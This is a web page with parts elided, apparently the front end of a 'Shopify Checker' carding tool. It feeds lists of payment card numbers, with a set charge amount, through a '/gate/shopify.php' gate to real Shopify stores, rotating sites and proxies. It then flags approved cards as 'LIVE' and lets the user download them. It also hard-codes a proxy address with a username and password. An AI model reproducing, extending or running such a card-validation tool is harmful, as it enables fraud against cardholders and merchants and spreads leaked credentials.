...
<head>
    ...
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        ...
        .page-subtitle { color: var(--text-muted); font-size: 0.7rem; }
        ...
        .endpoint-status { font-size: 0.65rem; padding: 0.3rem; border-radius: 0.3rem; margin-bottom: 0.5rem; }
        .endpoint-online { background: rgba(16, 185, 129, 0.1); color: var(--success); border: 1px solid var(--success); }
        .endpoint-offline { background: rgba(239, 68, 68, 0.1); color: var(--danger); border: 1px solid var(--danger); }
        
        .site-list { max-height: 150px; overflow-y: auto; }
        .site-item { padding: 0.2rem 0.4rem; cursor: pointer; border-radius: 0.3rem; font-size: 0.65rem; }
...
<body data-theme="dark">
    ...
    <main class="main" id="main">
        <div class="container">
            <div class="page-header">
                <h1 class="page-title">Shopify Checker</h1>
                <p class="page-subtitle">Test cards against Shopify stores | Custom API endpoint support</p>
            </div>
            ...
            <div class="checker-layout">
                ...
                <div class="card-input-section">
                    ...
                    <div class="checkbox-group">
                        <input type="checkbox" id="useDefaultSite" checked>
                        <label>Default Site (anseladams.org)</label>
                    </div>
                    <div class="input-group">
                        <label>Custom Site</label>
                        <input type="text" id="customSite" placeholder="https://example.myshopify.com">
                    </div>
                    
                    <div class="checkbox-group">
                        <input type="checkbox" id="useDefaultProxy">
                        <label>Default Proxy</label>
                    </div>
                    <div class="input-group">
                        <label>Custom Proxy</label>
                        <input type="text" id="customProxy" placeholder="ip:port:user:pass">
                    </div>
                    
                    <div class="input-group">
                        <label>Amount ($)</label>
                        <input type="text" id="amount" value="8.7">
                    </div>
                ...
                <div class="settings-section">
                    ...
                    <div class="input-group">
                        ...
                        <select id="endpointType">
                            <option value="default">Default Endpoint (/gate/shopify.php)</option>
                    ...
                    <div class="input-group" id="customEndpointGroup" style="display: none;">
                        ...
                        <input type="text" id="customEndpoint" placeholder="https://your-api.com/shopify.php">
                        <button class="btn btn-secondary btn-sm" id="testEndpointBtn" style="margin-top: 0.3rem; width: 100%;"><i class="fas fa-vial"></i> Test Endpoint</button>
                        <div id="endpointStatus" class="endpoint-status" style="margin-top: 0.3rem; display: none;"></div>
                    </div>
                    ...
                    <div class="input-group">
                        ...
                        <select id="siteMode">
                            ...
                            <option value="rotate">Rotate Sites</option>
                        </select>
                    </div>
                    
                    <div class="input-group" id="siteListGroup" style="display: none;">
                        <label>Site List</label>
                        <textarea id="siteList" rows="3" placeholder="https://anseladams.org&#10;https://startplanner.myshopify.com"></textarea>
                    </div>
                </div>
            </div>
            ...
            <div class="results-table">
                ...
                <div id="resultsContainer">
                    <div class="result-item unknown"><div><div class="result-status">Ready</div><div class="result-details">Enter cards and click Start</div></div></div>
                </div>
            </div>
        </div>
    </main>
    ...
    <script>
        ...
        let results = [];
        let approvedCards = [];
        let defaultEndpointWorks = true;
        
        // Load saved settings
        $('#delay').val(localStorage.getItem('shopify_delay') || '500');
        $('#threads').val(localStorage.getItem('shopify_threads') || '1');
        $('#amount').val(localStorage.getItem('shopify_amount') || '8.7');
        
        $('#delay, #threads, #amount').on('change', function() {
            localStorage.setItem('shopify_delay', $('#delay').val());
            localStorage.setItem('shopify_threads', $('#threads').val());
            localStorage.setItem('shopify_amount', $('#amount').val());
        });
        
        // Endpoint toggle
        $('#endpointType').on('change', function() {
            const isCustom = $(this).val() === 'custom';
            $('#customEndpointGroup').toggle(isCustom);
            localStorage.setItem('shopify_endpoint_type', $(this).val());
        });
        
        // Test custom endpoint
        $('#testEndpointBtn').on('click', async function() {
            const endpoint = $('#customEndpoint').val();
            if (!endpoint) {
                Swal.fire('Error', 'Please enter an endpoint URL', 'error');
                return;
            }
            
            $('#endpointStatus').show().html('<i class="fas fa-spinner fa-spin"></i> Testing endpoint...').removeClass('endpoint-online endpoint-offline');
            ...
            try {
                ...
                if (response && (response.Response || response.status)) {
                    $('#endpointStatus').html('<i class="fas fa-check-circle"></i> Endpoint is working').addClass('endpoint-online').removeClass('endpoint-offline');
                    Swal.fire('Success', 'Endpoint is working!', 'success');
                } else {
                    throw new Error('Invalid response');
                }
            } catch(e) {
                $('#endpointStatus').html('<i class="fas fa-exclamation-circle"></i> Endpoint is down or invalid').addClass('endpoint-offline').removeClass('endpoint-online');
                Swal.fire('Error', 'Endpoint is not responding correctly', 'error');
            }
        });
        
        // Check default endpoint status on load
        async function checkDefaultEndpoint() {
            try {
                const response = await $.ajax({
                    url: '/gate/shopify.php?test=1',
                    method: 'GET',
                    timeout: 5000
                });
                defaultEndpointWorks = true;
            } catch(e) {
                defaultEndpointWorks = false;
                Swal.fire({
                    title: 'Default Endpoint Down',
                    html: 'Default endpoint is not responding.<br>Please use a custom endpoint.',
                    icon: 'warning',
                    toast: false,
                    confirmButtonText: 'Use Custom Endpoint'
                }).then(() => {
                    $('#endpointType').val('custom').trigger('change');
                });
            }
        }
        checkDefaultEndpoint();
        
        // Site mode toggle
        $('#siteMode').on('change', function() {
            $('#siteListGroup').toggle($(this).val() === 'rotate');
        });
        ...
        $('#siteMode, #proxyMode').trigger('change');
        
        // Default site/proxy
        $('#useDefaultSite').on('change', function() {
            if($(this).is(':checked')) {
                $('#customSite').val('https://anseladams.org').prop('disabled', true);
            } else {
                $('#customSite').prop('disabled', false);
            }
        }).trigger('change');
        
        $('#useDefaultProxy').on('change', function() {
            if($(this).is(':checked')) {
                $('#customProxy').val('168.228.46.128:12345:tickets:proxyon145').prop('disabled', true);
            } else {
                $('#customProxy').prop('disabled', false);
            }
        });
        ...
        $('#downloadApprovedBtn').on('click', function() {
            ...
            a.download = `approved_${new Date().toISOString().slice(0,19)}.txt`;
            a.click();
        ...
        function updateResultsDisplay() {
            ...
            let html = '';
            filtered.forEach(r => {
                const statusClass = r.status === 'APPROVED' ? 'approved' : 'declined';
                html += `
                    <div class="result-item ${statusClass}">
                        <div style="flex:1;">
                            <div class="result-status ${statusClass}">${r.status}: ${r.message}</div>
                            <div class="result-details">${r.cc} | ${r.site} | $${r.amount}</div>
                            <div class="result-time">${r.time}</div>
                        </div>
                        <div>${r.status === 'APPROVED' ? '<span class="badge badge-success">LIVE</span>' : '<span class="badge badge-danger">DIE</span>'}</div>
                    </div>
                `;
            });
        ...
        function getSite() {
            if ($('#siteMode').val() === 'rotate') {
                const sites = $('#siteList').val().split('\n').filter(s => s.trim());
                if (sites.length) return sites[Math.floor(Math.random() * sites.length)].trim();
            }
            const customSite = $('#customSite').val();
            return customSite || 'https://anseladams.org';
        }
        
        function getProxy() {
            const mode = $('#proxyMode').val();
            if (mode === 'none') return '';
            if (mode === 'default') return '168.228.46.128:12345:tickets:proxyon145';
            if (mode === 'custom') return $('#customProxy').val();
            if (mode === 'rotate') {
        ...
        function getEndpoint() {
            ...
            return '/gate/shopify.php';
        }
        
        async function checkCard(card, amount) {
            const endpoint = getEndpoint();
            const site = getSite();
            const proxy = getProxy();
            
            return new Promise((resolve) => {
                const params = new URLSearchParams({ cc: card, url: site, amount: amount });
                ...
                $.ajax({
                    ...
                    error: (xhr) => resolve({ Response: `Request failed: ${xhr.statusText}`, status: 'ERROR', CC: card, Site: site })
                });
            });
        }
        ...
        async function runChecker() {
            ...
            const processCard = async (index) => {
                ...
                results.unshift({ status: 'PENDING', message: 'Checking...', cc: card, site: getSite(), amount: amount, time: time });
                updateResultsDisplay();
                
                try {
                    const response = await checkCard(card, amount);
                    let status = 'DECLINED', message = '', site = getSite();
                    ...
                    if (response.Response) {
                        ...
                        if (response.Site) site = response.Site;
                    ...
                    results[0] = { status, message: message.replace(/^(APPROVED|DECLINED):\s*/, ''), cc: card, site, amount, time };
                    
                    if (status === 'APPROVED') {
                        Swal.fire({ title: 'Approved!', html: `${card}<br>${site}<br>$${amount}`, icon: 'success', toast: true, timer: 3000, showConfirmButton: false, position: 'top-end' });
                    }
                } catch(e) {
                    results[0] = { status: 'ERROR', message: e.message, cc: card, site: getSite(), amount, time };
                }
